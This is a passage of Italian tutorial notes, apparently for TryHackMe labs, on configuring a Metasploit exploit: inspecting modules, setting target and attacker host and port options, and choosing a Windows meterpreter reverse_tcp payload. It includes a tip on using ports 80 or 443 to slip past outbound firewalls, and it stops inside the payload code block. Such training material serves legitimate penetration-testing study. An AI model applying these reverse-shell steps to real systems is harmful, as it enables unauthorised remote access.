# 🛠️ Fase 2: Configurazione dell'Exploit e Lancio

Una volta selezionato il modulo, la fase di configurazione è critica. Un errore qui può causare il fallimento dell'attacco o il crash del sistema target.

## 1. Analisi e Ispezione
Prima di configurare, dobbiamo capire cosa abbiamo in mano:
- `info`: Mostra l'autore (es. **todb**), le piattaforme supportate e i riferimenti CVE.
- `show targets`: Elenca le versioni specifiche del sistema operativo vulnerabili a questo exploit.

## 2. Configurazione delle Variabili (Options)
Usa il comando `show options` per vedere i parametri richiesti.

### 🌐 Variabili R-Serie (Remote/Target)
- **RHOSTS (Remote Hosts)**: L'indirizzo IP del bersaglio.
  - *Advanced*: Puoi usare un range (`10.10.1.1-20`) o un file (`file:/path/targets.txt`).
- **RPORT (Remote Port)**: La porta del servizio vulnerabile (verificala sempre con Nmap).

### 🏠 Variabili L-Serie (Local/Attaccante)
Necessarie per le **Reverse Shell**:
- **LHOST (Local Host)**: Il TUO indirizzo IP (su TryHackMe usa l'IP dell'interfaccia `tun0`).
- **LPORT (Local Port)**: La porta sulla tua macchina che riceverà la connessione.
  - *Pro Tip*: Usa porte comuni come 443 o 80 se sospetti che un firewall blocchi il traffico in uscita del target.



## 3. Selezione del Payload
Se vuoi cambiare l'azione post-exploit:
```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
